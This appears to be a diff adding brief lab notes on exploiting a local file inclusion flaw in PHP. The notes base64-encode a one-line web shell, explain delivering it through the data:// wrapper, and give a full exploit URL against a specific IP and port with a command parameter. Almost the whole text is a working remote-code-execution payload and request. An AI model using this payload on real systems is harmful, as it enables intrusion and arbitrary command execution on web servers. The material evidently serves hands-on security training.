@@ -1,0 +1,13 @@
+echo '<?php system($_GET["cmd"]); ?>' | base64
+
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+
+Now, we can URL encode the base64 string, and then pass it to the data wrapper with data://text/plain;base64,. Finally, we can use pass commands to the web shell with &cmd=<COMMAND>:
+
+
+
+
+rce via the base 64 and wrapers 
+http://94.237.48.51:32968/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=find 
+
+
